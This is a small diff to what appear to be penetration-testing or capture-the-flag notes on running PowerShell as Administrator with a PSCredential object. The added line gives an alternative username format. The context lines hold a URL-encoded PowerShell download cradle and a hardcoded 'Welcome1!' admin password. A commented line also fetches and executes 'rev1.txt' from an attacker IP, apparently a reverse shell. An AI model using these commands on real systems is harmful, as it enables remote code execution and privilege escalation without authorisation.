@@ -143,6 +143,8 @@ cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Obje
 #create credentials object
 $pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('Administrator',$pass)
+OR
+$cred = New-Object System.Management.Automation.PSCredential('Computername\\Administrator',$pass)
 ##### following line does not work
 #####start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.73/rev1.txt')" -credential $cred
 # run hostname
